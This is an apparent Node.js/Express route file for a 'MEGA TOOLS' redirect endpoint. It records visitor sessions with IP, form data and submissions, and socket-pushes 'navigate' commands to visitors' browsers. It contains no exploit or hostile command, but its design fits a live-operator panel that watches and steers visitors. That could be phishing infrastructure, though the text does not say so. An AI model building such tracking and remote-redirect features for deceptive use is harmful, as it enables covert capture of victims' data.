// ============================================================
// MEGA TOOLS — REDIRECT ROUTES (ENTERPRISE v2.2)
// FIXED: Null session guard for invalid trackingCode
// ENTERPRISE: Room-based emit
//
// FIX-RT1 (v2.1 — SINGLE-SESSION IDENTITY NORMALIZATION): retained.
//
// FIX-RT2 (v2.2 — REDIRECT = SILENT, NO sessionDelta EMIT):
//   User requirement: "Redirect → কোনো সাউন্ড নেই".
//
//   Verified root cause (FE AuthContext.jsx L817–831):
//     `sessionDelta` was triggering `playSound(sessionKey)` +
//     `notify('New Visitor Session', ...)` on every redirect,
//     because the FE gate treats `type='updated'` as eligible for
//     sound and the per-tab `firstSeenInThisTab` predicate resets
//     on reload/cross-tab. This caused spurious session sound and
//     notification on redirect — while the session was actually
//     unchanged on the server (FIX-S24 ownerCode fallback).
//
//   FIX: The redirect path no longer emits `sessionDelta`. The
//     `Session.upsert` still runs (so server-side identity
//     convergence works exactly as before), and `session_command`
//     is still delivered to the visitor socket so the browser
//     navigates correctly. Only the FE-sound-triggering event is
//     removed.
//
//   No other behaviour, response shape, or identity logic
//   changed. `Session.upsert` still returns `isNew` (unused here).
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Link = require('../models/Link');
const Session = require('../models/Session');
const { getSessionSockets } = require('../services/sessionManager');
// FIX-RT1: canonical identity normalizer
const { normalizeVisitorId, ownerCodeOf } = require('../utils/identity');

// FIX-RT2: buildSessionDelta kept for backward compatibility
// (may be used by tests / legacy consumers) but is no longer
// emitted from this route.
function buildSessionDelta(session, type) {
  return {
    type, timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      deviceClass: session.deviceClass,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
    },
  };
}

// Kept for consistency with webhook.js/data.js; unused on this route.
function emitToOwnerRoom(io, trackingCode, event, data) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  io.to('room_' + ownerCode).emit(event, data);
}

// ============================================================
// POST /api/redirect
// ============================================================
router.post('/', async (req, res) => {
  try {
    const { trackingCode, redirectCode, visitorId, ip } = req.body;

    if (!trackingCode || !redirectCode) {
      return res.status(400).json({ success: false, message: 'trackingCode and redirectCode are required' });
    }

    const allLinks = await db.links.read();
    const link = allLinks.find(l => l.redirectCode === redirectCode || l.baseCode === redirectCode);

    if (!link) {
      return res.status(404).json({ success: false, message: 'Link not found for this redirect code' });
    }

    const base = (link.baseUrl || 'http://localhost:5174').replace(/\/$/, '');
    const clientIp = ip || req.ip || '';

    // FIX-RT1: canonical identity — same format as data.js / webhook.js / socket
    const effectiveVisitorId = normalizeVisitorId({
      visitorId: visitorId || null,
      ip: clientIp || null,
      trackingCode,
    });

    // FIX-RT1: always echo ?vid= so the landing page can persist it
    const vid = effectiveVisitorId || '';
    const targetBase = `${base}/${trackingCode}_${link.redirectCode || link.baseCode}`;
    const targetUrl = vid
      ? `${targetBase}?vid=${encodeURIComponent(vid)}`
      : targetBase;

    let sessionTrackingCode = trackingCode;
    let sessionRejected = false;
    try {
      const result = await Session.upsert({
        visitorId: effectiveVisitorId,
        trackingCode,
        baseCode: link.redirectCode || link.baseCode || '',
        linkId: link._id ? link._id.toString() : null,
        ip: clientIp,
        browser: 'Unknown',
        deviceType: 'Desktop',
        entryUrl: link.redirectCode || link.baseCode || '',
        currentUrl: targetUrl,
        collectedTypes: ['redirect_click'],
      });

      if (!result || !result.session) {
        console.warn('[Redirect] Rejected invalid trackingCode:', trackingCode);
        sessionRejected = true;
      } else {
        const { session } = result;
        sessionTrackingCode = session.trackingCode || trackingCode;

        // FIX-RT2: NO `sessionDelta` emit — redirect must be silent.
        // The DB is updated (Session.upsert above); the FE will
        // receive the new row only via the next /visit or /sessions
        // fetch, and no session sound / notification will fire.
      }
    } catch (err) {
      console.error('[Redirect] Session update error:', err.message);
    }

    if (sessionRejected) {
      return res.status(400).json({ success: false, message: 'Invalid tracking code — session rejected' });
    }

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action: 'navigate',
      url: targetUrl,
      message: '',
      seq: Date.now(),
      visitorId: effectiveVisitorId || '',
      trackingCode: sessionTrackingCode,
      timestamp: new Date().toISOString(),
    };

    if (io) {
      // FIX-RT1: try multiple keys (exact visitorId, ip_*, tc_*, sid_*)
      const keysToTry = [
        effectiveVisitorId,
        effectiveVisitorId ? String(effectiveVisitorId) : null,
        visitorId || null,
      ].filter(Boolean);
      const delivered = new Set();
      for (const k of keysToTry) {
        const sid = sockets && sockets[k];
        if (sid && !delivered.has(sid)) {
          delivered.add(sid);
          try { io.to(sid).emit('session_command', command); } catch (_) {}
        }
      }
      if (sessionTrackingCode) {
        try { io.to('room_' + sessionTrackingCode).emit('session_command', command); } catch (_) {}
      }
      const ownerCode = ownerCodeOf(sessionTrackingCode);
      if (ownerCode) {
        try { io.to('room_' + ownerCode).emit('session_command', command); } catch (_) {}
      }
    }

    try {
      if (link._id) {
        const linkIndex = allLinks.findIndex(l =>
          (l._id?.toString?.() || l._id) === (link._id?.toString?.() || link._id)
        );
        if (linkIndex !== -1) {
          allLinks[linkIndex].total_clicks = (allLinks[linkIndex].total_clicks || 0) + 1;
          allLinks[linkIndex].last_click = new Date().toISOString();
          await db.links.write(allLinks);
        }
      }
    } catch (err) {
      console.error('[Redirect] Link update error:', err.message);
    }

    res.json({
      success: true,
      redirectUrl: targetUrl,
      linkName: link.name,
      message: 'Redirect URL generated',
    });
  } catch (err) {
    console.error('[Redirect] Error:', err.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;